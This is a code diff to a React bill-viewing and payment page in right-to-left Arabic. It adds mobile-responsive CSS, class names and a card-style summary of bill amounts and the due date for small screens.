@@ -176,6 +176,20 @@ export default function BillView() {
     @font-face { font-family: 'SE'; src: url('/fonts/SE-Medium.woff2') format('woff2'); font-weight: 500; }
     @font-face { font-family: 'SE'; src: url('/fonts/SE-SemiBold.woff2') format('woff2'); font-weight: 600; }
     @font-face { font-family: 'SE'; src: url('/fonts/SE-Light.woff2') format('woff2'); font-weight: 300; }
+    @media (max-width: 480px) {
+      .bill-header { padding: 12px 20px !important; height: 60px !important; }
+      .bill-header img { width: 70px !important; height: 45px !important; }
+      .bill-title-section { padding-top: 24px !important; padding-bottom: 20px !important; }
+      .bill-title-section h1 { font-size: 24px !important; }
+      .bill-title-section p { font-size: 14px !important; }
+      .bill-content { padding: 0 16px !important; }
+      .bill-table-wrap { display: none !important; }
+      .bill-cards-mobile { display: block !important; }
+      .bill-section-title { font-size: 17px !important; }
+      .bill-row span { font-size: 13px !important; }
+      .bill-pay-bar { padding: 12px 16px !important; }
+      .bill-pay-btn { padding: 12px 40px !important; font-size: 16px !important; width: 100% !important; }
+    }
   `;
 
   if (isLoading) {
@@ -223,7 +237,7 @@ export default function BillView() {
       <div className="min-h-screen bg-white" dir="rtl" style={{ fontFamily: "'SE', sans-serif", paddingBottom: '100px' }}>
 
         {/* Header */}
-        <div style={{
+        <div className="bill-header" style={{
           display: 'flex', alignItems: 'center', justifyContent: 'space-between',
           height: '70px', padding: '15px 55px 14px',
         }}>
@@ -243,7 +257,7 @@ export default function BillView() {
         </div>
 
         {/* Title */}
-        <div style={{ textAlign: 'center', paddingTop: '40px', paddingBottom: '30px' }}>
+        <div className="bill-title-section" style={{ textAlign: 'center', paddingTop: '40px', paddingBottom: '30px' }}>
           <p style={{ color: '#66799e', fontSize: '16px', fontWeight: 400, marginBottom: '8px' }}>عرض ودفع الفواتير</p>
           <h1 style={{ color: '#001f5e', fontSize: '36px', fontWeight: 600, letterSpacing: '1px', direction: 'ltr', display: 'inline-block' }}>
             {accountNumber}
@@ -251,7 +265,7 @@ export default function BillView() {
         </div>
 
         {/* Content */}
-        <div style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 30px' }}>
+        <div className="bill-content" style={{ maxWidth: '1200px', margin: '0 auto', padding: '0 30px' }}>
 
           {/* ===== Current Bill Summary ===== */}
           <div style={{ borderTop: '1px solid #e8ecf1', paddingTop: '24px' }}>
@@ -261,7 +275,8 @@ export default function BillView() {
                 <h2 style={{ color: '#06c', fontSize: '20px', fontWeight: 600, marginBottom: '24px', textAlign: 'right' }}>
                   ملخص الفاتورة الحالية
                 </h2>
-                <div style={{ overflowX: 'auto' }}>
+                {/* Desktop Table */}
+                <div className="bill-table-wrap" style={{ overflowX: 'auto' }}>
                   <table style={{ width: '100%', borderCollapse: 'collapse' }}>
                     <thead>
                       <tr>
@@ -292,6 +307,24 @@ export default function BillView() {
                       </tr>
                     </tbody>
                   </table>
+                </div>
+                {/* Mobile Cards */}
+                <div className="bill-cards-mobile" style={{ display: 'none' }}>
+                  {[
+                    { label: 'إجمالي الفاتورة', value: `﷼ ${parseFloat(bill.InvAmt || '0').toFixed(2)}`, bold: true },
+                    { label: 'المبلغ المتبقي', value: `﷼ ${parseFloat(bill.InvAmt || bill.TotalDueAmt || bill.TotalDueAmountDisplay || '0').toFixed(2)}` },
+                    { label: 'المبلغ المسدد', value: `﷼ ${parseFloat(bill.PreBal || '0').toFixed(2)}` },
+                    { label: 'المبلغ السابق', value: '﷼ 0.00' },
+                    { label: 'تاريخ بداية الاستحقاق', value: parseDateAr(bill.DueDate) },
+                  ].map((item, i) => (
+                    <div key={i} className="bill-row" style={{
+                      display: 'flex', justifyContent: 'space-between', alignItems: 'center',
+                      padding: '14px 0', borderBottom: '1px solid #f0f2f5',
+                    }}>
+                      <span style={{ color: '#66799e', fontSize: '14px', fontWeight: 400 }}>{item.label}</span>
+                      <span style={{ color: '#001f5e', fontSize: '14px', fontWeight: item.bold ? 600 : 400, direction: 'ltr' as const }}>{item.value}</span>
+                    </div>
+                  ))}
                 </div>
               </div>
             </div>
@@ -431,13 +464,13 @@ export default function BillView() {
         </div>
 
         {/* Fixed Pay Button */}
-        <div style={{
+        <div className="bill-pay-bar" style={{
           position: 'fixed', bottom: 0, left: 0, right: 0,
           padding: '16px 30px', background: 'white',
           borderTop: '1px solid #e8ecf1',
           display: 'flex', justifyContent: 'flex-end',
         }}>
-          <button onClick={handlePayBill} style={{
+          <button className="bill-pay-btn" onClick={handlePayBill} style={{
             fontFamily: "'SE', sans-serif", fontSize: '18px', fontWeight: 500,
             padding: '14px 60px', borderRadius: '12px', border: 'none', cursor: 'pointer',
             backgroundColor: '#06c', color: '#fff',
